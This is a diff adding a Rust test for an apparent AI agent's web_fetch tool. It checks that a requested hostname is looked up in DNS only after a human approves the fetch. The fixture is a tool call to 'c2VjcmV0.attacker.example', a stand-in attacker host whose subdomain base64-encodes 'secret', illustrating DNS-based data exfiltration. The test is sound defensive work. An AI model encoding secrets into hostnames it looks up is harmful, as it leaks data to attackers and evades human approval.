@@ -103,3 +103,38 @@ async fn html_comments_in_raw_markdown_are_dropped() {
     assert!(out.contains("Run `make`."), "{out}");
     assert!(out.contains("<!-- an example comment -->"), "a comment in a code block is code: {out}");
 }
+
+/// A resolver that counts its lookups and answers a private address (so an approved fetch stops before connecting).
+#[derive(Default)]
+struct Counting(std::sync::atomic::AtomicUsize);
+
+#[async_trait::async_trait]
+impl marv_tools::web::address::Resolve for Counting {
+    async fn lookup(&self, _host: &str) -> Result<Vec<std::net::IpAddr>, marv_tools::web::address::LookupError> {
+        self.0.fetch_add(1, std::sync::atomic::Ordering::SeqCst);
+        Ok(vec!["10.0.0.1".parse().unwrap()])
+    }
+}
+
+/// **A fetch's name reaches DNS only after the fetch is approved.** A name can carry data (`<secret>.example.com`),
+/// and a lookup sends it out: declined, the fetch makes no lookup at all; approved, it looks the name up before it
+/// connects (and still refuses a private answer).
+///
+/// Proven: put `check_address` (with its lookup) back in `WebFetch::preview` → the declined fetch made a lookup.
+#[tokio::test]
+async fn a_fetchs_name_is_looked_up_only_after_its_approved() {
+    let counting = Arc::new(Counting::default());
+    let resolver = marv_tools::web_fetch::Resolver(counting.clone());
+    let tool: Vec<ToolRef> = vec![Arc::new(WebFetch::new(WebOptions { resolver: Some(resolver), ..WebOptions::default() }))];
+    let fetch = call("web_fetch", json!({"url": "https://c2VjcmV0.attacker.example/"}));
+    for declined in [Decision::No, Decision::Unavailable] {
+        let ctx = ToolContext { approver: Some(Recorder::new(declined)), ..ToolContext::new("/tmp/marv-guard-dns") };
+        ctx.taint.mark(marv_core::Provenance::Web);
+        run_tool(&fetch, &ctx, &tool).await;
+        assert_eq!(counting.0.load(std::sync::atomic::Ordering::SeqCst), 0, "a declined fetch reached DNS");
+    }
+    let ctx = ToolContext { approver: Some(Recorder::new(Decision::Yes)), ..ToolContext::new("/tmp/marv-guard-dns") };
+    let out = run_tool(&fetch, &ctx, &tool).await;
+    assert_eq!(counting.0.load(std::sync::atomic::Ordering::SeqCst), 1, "the approved fetch looks the name up");
+    assert!(out.result.output.contains("private address"), "{}", out.result.output);
+}
